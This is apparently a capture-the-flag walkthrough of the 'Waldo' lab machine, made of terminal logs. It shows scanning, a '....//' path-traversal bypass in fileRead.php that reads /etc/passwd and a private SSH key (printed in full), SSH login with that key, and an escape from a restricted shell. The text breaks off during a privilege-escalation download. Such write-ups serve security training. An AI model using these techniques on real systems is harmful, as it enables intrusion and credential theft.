#### Waldo

- [Attacker Info](#attacker-info)
- [Nmap Scan](#nmap-scan)
- [Inspecting port 8888](#inspecting-port-8888)
- [Web Enumeration](#web-enumeration)
- [SSH Enumeration](#ssh-enumeration)
- [Privilege Escalation](#privilege-escalation)
- [Escape rBash and setup a SSH Tunnel](#escape-rbash-and-setup-a-ssh-tunnel)

###### Attacker Info

```sh
root@kali:~/waldo# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.0.0.193  netmask 255.255.255.0  broadcast 10.0.0.255
        inet6 2601:5cc:c900:4024::b896  prefixlen 128  scopeid 0x0<global>
        inet6 2601:5cc:c900:4024:7cbe:e14a:1acf:e588  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::20c:29ff:fe8c:4d61  prefixlen 64  scopeid 0x20<link>
        inet6 2601:5cc:c900:4024:20c:29ff:fe8c:4d61  prefixlen 64  scopeid 0x0<global>
        ether 00:0c:29:8c:4d:61  txqueuelen 1000  (Ethernet)
        RX packets 1382  bytes 1721475 (1.6 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 348  bytes 39156 (38.2 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 24  bytes 1272 (1.2 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 24  bytes 1272 (1.2 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
        inet 10.10.14.9  netmask 255.255.254.0  destination 10.10.14.9
        inet6 fe80::ffdd:c8b2:472b:655a  prefixlen 64  scopeid 0x20<link>
        inet6 dead:beef:2::1007  prefixlen 64  scopeid 0x0<global>
        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 100  (UNSPEC)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2  bytes 96 (96.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@kali:~/waldo#
```

###### Nmap Scan

```sh
root@kali:~/waldo# nmap -sC -sV -oA waldo.nmap 10.10.10.87
Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-02 17:56 EST
Nmap scan report for 10.10.10.87
Host is up (0.037s latency).
Not shown: 997 closed ports
PORT     STATE    SERVICE        VERSION
22/tcp   open     ssh            OpenSSH 7.5 (protocol 2.0)
| ssh-hostkey:
|   2048 c4:ff:81:aa:ac:df:66:9e:da:e1:c8:78:00:ab:32:9e (RSA)
|   256 b3:e7:54:6a:16:bd:c9:29:1f:4a:8c:cd:4c:01:24:27 (ECDSA)
|_  256 38:64:ac:57:56:44:d5:69:de:74:a8:88:dc:a0:b4:fd (ED25519)
80/tcp   open     http           nginx 1.12.2
|_http-server-header: nginx/1.12.2
| http-title: List Manager
|_Requested resource was /list.html
|_http-trane-info: Problem with XML parsing of /evox/about
8888/tcp filtered sun-answerbook

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.81 seconds
root@kali:~/waldo#
```

###### Inspecting port 8888

```sh
root@kali:~/waldo# cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	kali
10.10.14.9	ATTACKER
10.10.10.87	WALDO

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
root@kali:~/waldo#
```

```sh
root@kali:~/waldo# nc 10.10.10.87 8888
(UNKNOWN) [10.10.10.87] 8888 (?) : Connection timed out
root@kali:~/waldo#
```

```sh
root@kali:~/waldo# tcpdump -i tun0
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
18:03:50.241047 IP ATTACKER.52842 > WALDO.8888: Flags [S], seq 3951177841, win 29200, options [mss 1460,sackOK,TS val 3637199464 ecr 0,nop,wscale 7], length 0
18:03:51.272374 IP ATTACKER.52842 > WALDO.8888: Flags [S], seq 3951177841, win 29200, options [mss 1460,sackOK,TS val 3637200496 ecr 0,nop,wscale 7], length 0
18:03:53.286630 IP ATTACKER.52842 > WALDO.8888: Flags [S], seq 3951177841, win 29200, options [mss 1460,sackOK,TS val 3637202509 ecr 0,nop,wscale 7], length 0
18:03:57.543153 IP ATTACKER.52842 > WALDO.8888: Flags [S], seq 3951177841, win 29200, options [mss 1460,sackOK,TS val 3637206765 ecr 0,nop,wscale 7], length 0
18:04:05.735585 IP ATTACKER.52842 > WALDO.8888: Flags [S], seq 3951177841, win 29200, options [mss 1460,sackOK,TS val 3637214956 ecr 0,nop,wscale 7], length 0
18:04:21.864222 IP ATTACKER.52842 > WALDO.8888: Flags [S], seq 3951177841, win 29200, options [mss 1460,sackOK,TS val 3637231084 ecr 0,nop,wscale 7], length 0
18:04:54.632055 IP ATTACKER.52842 > WALDO.8888: Flags [S], seq 3951177841, win 29200, options [mss 1460,sackOK,TS val 3637263859 ecr 0,nop,wscale 7], length 0
18:05:27.399083 IP6 kali > ip6-allrouters: ICMP6, router solicitation, length 8
```

![](images/1.png)

###### Web Enumeration

```
http://10.10.10.87/list.html
```

![](images/2.png)

```sh
root@kali:~/waldo# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.87

=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.87/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2019/01/02 18:09:30 Starting gobuster
=====================================================
2019/01/02 18:09:30 [-] Wildcard response found: http://10.10.10.87/2251c3f9-0e00-412e-b01f-fa42d5e385cd => 302
2019/01/02 18:09:30 [!] To force processing of Wildcard responses, specify the '-fw' switch.
=====================================================
2019/01/02 18:09:30 Finished
=====================================================
root@kali:~/waldo#
```

```sh
root@kali:~/waldo# curl http://10.10.10.87/TestPage-123479ibdhbwugduy
```

```sh
root@kali:~/waldo# curl -v http://10.10.10.87/TestPage-123479ibdhbwugduy
*   Trying 10.10.10.87...
* TCP_NODELAY set
* Connected to 10.10.10.87 (10.10.10.87) port 80 (#0)
> GET /TestPage-123479ibdhbwugduy HTTP/1.1
> Host: 10.10.10.87
> User-Agent: curl/7.61.0
> Accept: */*
>
< HTTP/1.1 302 Found
< Server: nginx/1.12.2
< Date: Wed, 02 Jan 2019 23:16:05 GMT
< Content-Type: text/html; charset=UTF-8
< Transfer-Encoding: chunked
< Connection: keep-alive
< X-Powered-By: PHP/7.1.16
< Location: /list.html
<
* Connection #0 to host 10.10.10.87 left intact
root@kali:~/waldo#
```

```sh
root@kali:~/waldo# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.87 -s 200,204,301,307,403

=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.87/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,307,403
[+] Timeout      : 10s
=====================================================
2019/01/02 18:12:44 Starting gobuster
=====================================================
=====================================================
2019/01/02 18:26:44 Finished
=====================================================
root@kali:~/waldo#
```

![](images/3.png)

![](images/4.png)

![](images/5.png)

![](images/6.png)

![](images/7.png)

![](images/8.png)

```sh
root@kali:~/waldo# apt install jq
```

![](images/9.png)

```sh
root@kali:~/waldo# curl -s http://10.10.10.87/fileRead.php -d 'file=fileRead.php' | jq
{
  "file": "<?php\n\n\nif($_SERVER['REQUEST_METHOD'] === \"POST\"){\n\t$fileContent['file'] = false;\n\theader('Content-Type: application/json');\n\tif(isset($_POST['file'])){\n\t\theader('Content-Type: application/json');\n\t\t$_POST['file'] = str_replace( array(\"../\", \"..\\\"\"), \"\", $_POST['file']);\n\t\tif(strpos($_POST['file'], \"user.txt\") === false){\n\t\t\t$file = fopen(\"/var/www/html/\" . $_POST['file'], \"r\");\n\t\t\t$fileContent['file'] = fread($file,filesize($_POST['file']));  \n\t\t\tfclose();\n\t\t}\n\t}\n\techo json_encode($fileContent);\n}\n"
}
root@kali:~/waldo#
```

```sh
root@kali:~/waldo# curl -s http://10.10.10.87/fileRead.php -d 'file=fileRead.php' | jq -r ."file"
<?php


if($_SERVER['REQUEST_METHOD'] === "POST"){
	$fileContent['file'] = false;
	header('Content-Type: application/json');
	if(isset($_POST['file'])){
		header('Content-Type: application/json');
		$_POST['file'] = str_replace( array("../", "..\""), "", $_POST['file']);
		if(strpos($_POST['file'], "user.txt") === false){
			$file = fopen("/var/www/html/" . $_POST['file'], "r");
			$fileContent['file'] = fread($file,filesize($_POST['file']));
			fclose();
		}
	}
	echo json_encode($fileContent);
}

root@kali:~/waldo#
```

![](images/10.png)

```sh
root@kali:~/waldo# curl -s http://10.10.10.87/fileRead.php -d 'file=....//....//....//....//etc/passwd' | jq -r ."file"
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/bin/sh
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/spool/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
postgres:x:70:70::/var/lib/postgresql:/bin/sh
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/home/nobody:/bin/sh
nginx:x:100:101:nginx:/var/lib/nginx:/sbin/nologin

root@kali:~/waldo#
```

![](images/11.png)

```sh
root@kali:~/waldo# curl -s http://10.10.10.87/dirRead.php -d 'path=.' | jq
[
  ".",
  "..",
  ".list",
  "background.jpg",
  "cursor.png",
  "dirRead.php",
  "face.png",
  "fileDelete.php",
  "fileRead.php",
  "fileWrite.php",
  "index.php",
  "list.html",
  "list.js"
]
root@kali:~/waldo#
```

```sh
root@kali:~/waldo# curl -s http://10.10.10.87/dirRead.php -d 'path=....//....//....//' | jq
[
  ".",
  "..",
  ".dockerenv",
  "bin",
  "dev",
  "etc",
  "home",
  "lib",
  "media",
  "mnt",
  "proc",
  "root",
  "run",
  "sbin",
  "srv",
  "sys",
  "tmp",
  "usr",
  "var"
]
root@kali:~/waldo#
```

```sh
root@kali:~/waldo# curl -s http://10.10.10.87/dirRead.php -d 'path=....//....//....//home' | jq
[
  ".",
  "..",
  "nobody"
]
root@kali:~/waldo# 
```

```sh
root@kali:~/waldo# curl -s http://10.10.10.87/dirRead.php -d 'path=....//....//....//home/nobody' | jq
[
  ".",
  "..",
  ".ash_history",
  ".ssh",
  ".viminfo",
  "user.txt"
]
root@kali:~/waldo# 
```

```sh
root@kali:~/waldo# curl -s http://10.10.10.87/dirRead.php -d 'path=....//....//....//home/nobody/.ssh' | jq
[
  ".",
  "..",
  ".monitor",
  "authorized_keys",
  "known_hosts"
]
root@kali:~/waldo# 
```

```sh
root@kali:~/waldo# curl -s http://10.10.10.87/dirRead.php -d 'path=....//....//....//home/nobody/.ssh/.monitor' | jq
false
root@kali:~/waldo#
```

```sh
root@kali:~/waldo# curl -s http://10.10.10.87/fileRead.php -d 'file=....//....//....//home/nobody/.ssh/.monitor' | jq -r ."file"
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAs7sytDE++NHaWB9e+NN3V5t1DP1TYHc+4o8D362l5Nwf6Cpl
mR4JH6n4Nccdm1ZU+qB77li8ZOvymBtIEY4Fm07X4Pqt4zeNBfqKWkOcyV1TLW6f
87s0FZBhYAizGrNNeLLhB1IZIjpDVJUbSXG6s2cxAle14cj+pnEiRTsyMiq1nJCS
dGCc/gNpW/AANIN4vW9KslLqiAEDJfchY55sCJ5162Y9+I1xzqF8e9b12wVXirvN
o8PLGnFJVw6SHhmPJsue9vjAIeH+n+5Xkbc8/6pceowqs9ujRkNzH9T1lJq4Fx1V
vi93Daq3bZ3dhIIWaWafmqzg+jSThSWOIwR73wIDAQABAoIBADHwl/wdmuPEW6kU
vmzhRU3gcjuzwBET0TNejbL/KxNWXr9B2I0dHWfg8Ijw1Lcu29nv8b+ehGp+bR/6
pKHMFp66350xylNSQishHIRMOSpydgQvst4kbCp5vbTTdgC7RZF+EqzYEQfDrKW5
8KUNptTmnWWLPYyJLsjMsrsN4bqyT3vrkTykJ9iGU2RrKGxrndCAC9exgruevj3q
1h+7o8kGEpmKnEOgUgEJrN69hxYHfbeJ0Wlll8Wort9yummox/05qoOBL4kQxUM7
VxI2Ywu46+QTzTMeOKJoyLCGLyxDkg5ONdfDPBW3w8O6UlVfkv467M3ZB5ye8GeS
dVa3yLECgYEA7jk51MvUGSIFF6GkXsNb/w2cZGe9TiXBWUqWEEig0bmQQVx2ZWWO
v0og0X/iROXAcp6Z9WGpIc6FhVgJd/4bNlTR+A/lWQwFt1b6l03xdsyaIyIWi9xr
xsb2sLNWP56A/5TWTpOkfDbGCQrqHvukWSHlYFOzgQa0ZtMnV71ykH0CgYEAwSSY
qFfdAWrvVZjp26Yf/jnZavLCAC5hmho7eX5isCVcX86MHqpEYAFCecZN2dFFoPqI
yzHzgb9N6Z01YUEKqrknO3tA6JYJ9ojaMF8GZWvUtPzN41ksnD4MwETBEd4bUaH1
/pAcw/+/oYsh4BwkKnVHkNw36c+WmNoaX1FWqIsCgYBYw/IMnLa3drm3CIAa32iU
LRotP4qGaAMXpncsMiPage6CrFVhiuoZ1SFNbv189q8zBm4PxQgklLOj8B33HDQ/
lnN2n1WyTIyEuGA/qMdkoPB+TuFf1A5EzzZ0uR5WLlWa5nbEaLdNoYtBK1P5n4Kp
w7uYnRex6DGobt2mD+10cQKBgGVQlyune20k9QsHvZTU3e9z1RL+6LlDmztFC3G9
1HLmBkDTjjj/xAJAZuiOF4Rs/INnKJ6+QygKfApRxxCPF9NacLQJAZGAMxW50AqT
rj1BhUCzZCUgQABtpC6vYj/HLLlzpiC05AIEhDdvToPK/0WuY64fds0VccAYmMDr
X/PlAoGAS6UhbCm5TWZhtL/hdprOfar3QkXwZ5xvaykB90XgIps5CwUGCCsvwQf2
DvVny8gKbM/OenwHnTlwRTEj5qdeAM40oj/mwCDc6kpV1lJXrW2R5mCH9zgbNFla
W0iKCBUAm5xZgU/YskMsCBMNmA8A5ndRWGFEFE+VGDVPaRie0ro=
-----END RSA PRIVATE KEY-----

root@kali:~/waldo#
```

###### SSH Enumeration

```sh
root@kali:~/waldo# cat nobody.ssh
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAs7sytDE++NHaWB9e+NN3V5t1DP1TYHc+4o8D362l5Nwf6Cpl
mR4JH6n4Nccdm1ZU+qB77li8ZOvymBtIEY4Fm07X4Pqt4zeNBfqKWkOcyV1TLW6f
87s0FZBhYAizGrNNeLLhB1IZIjpDVJUbSXG6s2cxAle14cj+pnEiRTsyMiq1nJCS
dGCc/gNpW/AANIN4vW9KslLqiAEDJfchY55sCJ5162Y9+I1xzqF8e9b12wVXirvN
o8PLGnFJVw6SHhmPJsue9vjAIeH+n+5Xkbc8/6pceowqs9ujRkNzH9T1lJq4Fx1V
vi93Daq3bZ3dhIIWaWafmqzg+jSThSWOIwR73wIDAQABAoIBADHwl/wdmuPEW6kU
vmzhRU3gcjuzwBET0TNejbL/KxNWXr9B2I0dHWfg8Ijw1Lcu29nv8b+ehGp+bR/6
pKHMFp66350xylNSQishHIRMOSpydgQvst4kbCp5vbTTdgC7RZF+EqzYEQfDrKW5
8KUNptTmnWWLPYyJLsjMsrsN4bqyT3vrkTykJ9iGU2RrKGxrndCAC9exgruevj3q
1h+7o8kGEpmKnEOgUgEJrN69hxYHfbeJ0Wlll8Wort9yummox/05qoOBL4kQxUM7
VxI2Ywu46+QTzTMeOKJoyLCGLyxDkg5ONdfDPBW3w8O6UlVfkv467M3ZB5ye8GeS
dVa3yLECgYEA7jk51MvUGSIFF6GkXsNb/w2cZGe9TiXBWUqWEEig0bmQQVx2ZWWO
v0og0X/iROXAcp6Z9WGpIc6FhVgJd/4bNlTR+A/lWQwFt1b6l03xdsyaIyIWi9xr
xsb2sLNWP56A/5TWTpOkfDbGCQrqHvukWSHlYFOzgQa0ZtMnV71ykH0CgYEAwSSY
qFfdAWrvVZjp26Yf/jnZavLCAC5hmho7eX5isCVcX86MHqpEYAFCecZN2dFFoPqI
yzHzgb9N6Z01YUEKqrknO3tA6JYJ9ojaMF8GZWvUtPzN41ksnD4MwETBEd4bUaH1
/pAcw/+/oYsh4BwkKnVHkNw36c+WmNoaX1FWqIsCgYBYw/IMnLa3drm3CIAa32iU
LRotP4qGaAMXpncsMiPage6CrFVhiuoZ1SFNbv189q8zBm4PxQgklLOj8B33HDQ/
lnN2n1WyTIyEuGA/qMdkoPB+TuFf1A5EzzZ0uR5WLlWa5nbEaLdNoYtBK1P5n4Kp
w7uYnRex6DGobt2mD+10cQKBgGVQlyune20k9QsHvZTU3e9z1RL+6LlDmztFC3G9
1HLmBkDTjjj/xAJAZuiOF4Rs/INnKJ6+QygKfApRxxCPF9NacLQJAZGAMxW50AqT
rj1BhUCzZCUgQABtpC6vYj/HLLlzpiC05AIEhDdvToPK/0WuY64fds0VccAYmMDr
X/PlAoGAS6UhbCm5TWZhtL/hdprOfar3QkXwZ5xvaykB90XgIps5CwUGCCsvwQf2
DvVny8gKbM/OenwHnTlwRTEj5qdeAM40oj/mwCDc6kpV1lJXrW2R5mCH9zgbNFla
W0iKCBUAm5xZgU/YskMsCBMNmA8A5ndRWGFEFE+VGDVPaRie0ro=
-----END RSA PRIVATE KEY-----
root@kali:~/waldo#
```

```sh
root@kali:~/waldo# chmod 600 nobody.ssh
```

```sh
root@kali:~/waldo# ssh -i nobody.ssh nobody@10.10.10.87
The authenticity of host '10.10.10.87 (10.10.10.87)' can't be established.
ECDSA key fingerprint is SHA256:S4nfJbcTY7WAdYp2v16xgnUj4MEIzqZ/jwbGI92FXEk.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.10.10.87' (ECDSA) to the list of known hosts.
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See <http://wiki.alpinelinux.org>.
waldo:~$ id
uid=65534(nobody) gid=65534(nobody) groups=65534(nobody)
waldo:~$ ls -l
total 4
-r--------    1 nobody   nobody          33 May  3  2018 user.txt
waldo:~$ cat user.txt
32768bcd7513275e085fd4e7b63e9d24
waldo:~$
```

![](images/12.png)

![](images/13.png)

```sh
waldo:~$ ls -lah
total 20
drwxr-xr-x    1 nobody   nobody      4.0K Jul 24 13:30 .
drwxr-xr-x    1 root     root        4.0K May  3  2018 ..
lrwxrwxrwx    1 root     root           9 Jul 24 11:57 .ash_history -> /dev/null
drwx------    1 nobody   nobody      4.0K Jul 15 14:07 .ssh
-rw-------    1 nobody   nobody      1.2K Jul 24 13:28 .viminfo
-r--------    1 nobody   nobody        33 May  3  2018 user.txt
waldo:~$ cd .ssh/
waldo:~/.ssh$ ls -lah
total 20
drwx------    1 nobody   nobody      4.0K Jul 15 14:07 .
drwxr-xr-x    1 nobody   nobody      4.0K Jul 24 13:30 ..
-rw-------    1 nobody   nobody      1.6K May  3  2018 .monitor
-rw-------    1 nobody   nobody       394 May  3  2018 authorized_keys
-rw-r--r--    1 nobody   nobody       171 Jul 15 14:07 known_hosts
waldo:~/.ssh$
waldo:~/.ssh$ cat authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzuzK0MT740dpYH17403dXm3UM/VNgdz7ijwPfraXk3B/oKmWZHgkfqfg1xx2bVlT6oHvuWLxk6/KYG0gRjgWbTtfg+q3jN40F+opaQ5zJXVMtbp/zuzQVkGFgCLMas014suEHUhkiOkNUlRtJcbqzZzECV7XhyP6mcSJFOzIyKrWckJJ0YJz+A2lb8AA0g3i9b0qyUuqIAQMl9yFjnmwInnXrZj34jXHOoXx71vXbBVeKu82jw8sacUlXDpIeGY8my572+MAh4f6f7leRtzz/qlx6jCqz26NGQ3Mf1PWUmrgXHVW+L3cNqrdtnd2EghZpZp+arOD6NJOFJY4jBHvf monitor@waldo
waldo:~/.ssh$
```

```sh
waldo:~/.ssh$ ssh -i .monitor monitor@127.0.0.1
The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:YHb7KyiwRxyN62du1P80KmeA9Ap50jgU6JlRaXThs/M.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '127.0.0.1' (ECDSA) to the list of known hosts.
Linux waldo 4.9.0-6-amd64 #1 SMP Debian 4.9.88-1 (2018-04-29) x86_64
           &.
          @@@,@@/ %
       #*/%@@@@/.&@@,
   @@@#@@#&@#&#&@@@,*%/
   /@@@&###########@@&*(*
 (@################%@@@@@.     /**
 @@@@&#############%@@@@@@@@@@@@@@@@@@@@@@@@%((/
 %@@@@%##########&@@@....                 .#%#@@@@@@@#
 @@&%#########@@@@/                        */@@@%(((@@@%
    @@@#%@@%@@@,                       *&@@@&%(((#((((@@(
     /(@@@@@@@                     *&@@@@%((((((((((((#@@(
       %/#@@@/@ @#/@          ..@@@@%(((((((((((#((#@@@@@@@@@@@@&#,
          %@*(@#%@.,       /@@@@&(((((((((((((((&@@@@@@&#######%%@@@@#    &
        *@@@@@#        .&@@@#(((#(#((((((((#%@@@@@%###&@@@@@@@@@&%##&@@@@@@/
       /@@          #@@@&#(((((((((((#((@@@@@%%%%@@@@%#########%&@@@@@@@@&
      *@@      *%@@@@#((((((((((((((#@@@@@@@@@@%####%@@@@@@@@@@@@###&@@@@@@@&
      %@/ .&%@@%#(((((((((((((((#@@@@@@@&#####%@@@%#############%@@@&%##&@@/
      @@@@@@%(((((((((((##(((@@@@&%####%@@@%#####&@@@@@@@@@@@@@@@&##&@@@@@@@@@/
     @@@&(((#((((((((((((#@@@@@&@@@@######@@@###################&@@@&#####%@@*
     @@#(((((((((((((#@@@@%&@@.,,.*@@@%#####@@@@@@@@@@@@@@@@@@@%####%@@@@@@@@@@
     *@@%((((((((#@@@@@@@%#&@@,,.,,.&@@@#####################%@@@@@@%######&@@.
       @@@#(#&@@@@@&##&@@@&#@@/,,,,,,,,@@@&######&@@@@@@@@&&%######%@@@@@@@@@@@
        @@@@@@&%&@@@%#&@%%@@@@/,,,,,,,,,,/@@@@@@@#/,,.*&@@%&@@@@@@&%#####%@@@@.
          .@@@###&@@@%%@(,,,%@&,.,,,,,,,,,,,,,.*&@@@@&(,*@&#@%%@@@@@@@@@@@@*
            @@%##%@@/@@@%/@@@@@@@@@#,,,,.../@@@@@%#%&@@@@(&@&@&@@@@(
            .@@&##@@,,/@@@@&(.  .&@@@&,,,.&@@/         #@@%@@@@@&@@@/
           *@@@@@&@@.*@@@          %@@@*,&@@            *@@@@@&.#/,@/
          *@@&*#@@@@@@@&     #@(    .@@@@@@&    ,@@@,    @@@@@(,@/@@
          *@@/@#.#@@@@@/    %@@@,   .@@&%@@@     &@&     @@*@@*(@@#
           (@@/@,,@@&@@@            &@@,,(@@&          .@@%/@@,@@
             /@@@*,@@,@@@*         @@@,,,,,@@@@.     *@@@%,@@**@#
               %@@.%@&,(@@@@,  /&@@@@,,,,,,,%@@@@@@@@@@%,,*@@,#@,
                ,@@,&@,,,,(@@@@@@@(,,,,,.,,,,,,,,**,,,,,,.*@/,&@
                 &@,*@@.,,,,,..,,,,&@@%/**/@@*,,,,,&(.,,,.@@,,@@
                 /@%,&@/,,,,/@%,,,,,*&@@@@@#.,,,,,.@@@(,,(@@@@@(
                  @@*,@@,,,#@@@&*..,,,,,,,,,,,,/@@@@,*(,,&@/#*
                  *@@@@@(,,@*,%@@@@@@@&&#%@@@@@@@/,,,,,,,@@
                       @@*,,,,,,,,,.*/(//*,..,,,,,,,,,,,&@,
                        @@,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,@@
                        &@&,,,,,,,,,,,,,,,,,,,,,,,,,,,,&@#
                         %@(,,,,,,,,,,,,,,,,,,,,,,,,,,,@@
                         ,@@,,,,,,,,@@@&&&%&@,,,,,..,,@@,
                          *@@,,,,,,,.,****,..,,,,,,,,&@@
                           (@(,,,.,,,,,,,,,,,,,,.,,,/@@
                           .@@,,,,,,,,,,,,,...,,,,,,@@
                            ,@@@,,,,,,,,,,,,,,,,.(@@@
                              %@@@@&(,,,,*(#&@@@@@@,

                            Here's Waldo, where's root?
Last login: Tue Jul 24 08:09:03 2018 from 127.0.0.1
-rbash: alias: command not found
monitor@waldo:~$
```

```sh
monitor@waldo:~$ echo $SHELL
/bin/rbash
monitor@waldo:~$
monitor@waldo:~$ echo $PATH
/home/monitor/bin:/home/monitor/app-dev:/home/monitor/app-dev/v0.1
monitor@waldo:~$
```

```sh
monitor@waldo:~$ ls -lah /home/monitor/bin
total 8.0K
dr-xr-x--- 2 root monitor 4.0K May  3  2018 .
drwxr-x--- 5 root monitor 4.0K Jul 24 07:58 ..
lrwxrwxrwx 1 root root       7 May  3  2018 ls -> /bin/ls
lrwxrwxrwx 1 root root      13 May  3  2018 most -> /usr/bin/most
lrwxrwxrwx 1 root root       7 May  3  2018 red -> /bin/ed
lrwxrwxrwx 1 root root       9 May  3  2018 rnano -> /bin/nano
monitor@waldo:~$
monitor@waldo:~$ ls -lah /bin/ls
-rwxr-xr-x 1 root root 128K Feb 22  2017 /bin/ls
monitor@waldo:~$
monitor@waldo:~$ ls -lah /home/monitor/app-dev
total 2.2M
drwxrwx--- 3 app-dev monitor 4.0K May  3  2018 .
drwxr-x--- 5 root    monitor 4.0K Jul 24 07:58 ..
-rwxrwx--- 1 app-dev monitor  14K Jul 24 08:10 logMonitor
-r--r----- 1 app-dev monitor  14K May  3  2018 logMonitor.bak
-rw-rw---- 1 app-dev monitor 2.7K May  3  2018 logMonitor.c
-rw-rw---- 1 app-dev monitor  488 May  3  2018 logMonitor.h
-rw-rw---- 1 app-dev monitor 2.2M May  3  2018 logMonitor.h.gch
-rw-rw---- 1 app-dev monitor 6.7K May  3  2018 logMonitor.o
-rwxr----- 1 app-dev monitor  266 May  3  2018 makefile
-r-xr-x--- 1 app-dev monitor  795 May  3  2018 .restrictScript.sh
drwxr-x--- 2 app-dev monitor 4.0K May  3  2018 v0.1
monitor@waldo:~$
monitor@waldo:~$ ls -lah /home/monitor/app-dev/v0.1
total 24K
drwxr-x--- 2 app-dev monitor 4.0K May  3  2018 .
drwxrwx--- 3 app-dev monitor 4.0K May  3  2018 ..
-r-xr-x--- 1 app-dev monitor  14K May  3  2018 logMonitor-0.1
monitor@waldo:~$
```

```sh
monitor@waldo:~$ rnano /etc/groups
```

![](images/14.png)

```sh
monitor@waldo:~$ rnano /etc/group
```

![](images/15.png)

```sh
monitor@waldo:~$ red /bin/bash
1099016
w app-dev/logMonitor
1099016
q
monitor@waldo:~$
```

```sh
root@kali:~/waldo# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
root@kali:~/waldo#
```

```sh
monitor@waldo:~$ logMonitor
tmp.LZf3DgyKqq: dircolors: command not found
monitor@waldo:~$
monitor@waldo:~$ echo $PATH
/home/monitor/bin:/home/monitor/app-dev:/home/monitor/app-dev/v0.1
monitor@waldo:~$
monitor@waldo:~$ bash
tmp.LZf3DgyKqq: bash: command not found
monitor@waldo:~$
```

```sh
monitor@waldo:~$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
monitor@waldo:~$
monitor@waldo:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
monitor@waldo:~$
monitor@waldo:~$ bash
monitor@waldo:~$
```

###### Privilege Escalation

```sh
root@kali:/opt/linux-privesc# wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
--2019-01-02 19:10:56--  https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.200.133
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.200.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 45578 (45K) [text/plain]
Saving to: ‘LinEnum.sh’

LinEnum.sh                                         100%[================================================================================================================>]  44.51K  --.-KB/s    in 0.04s

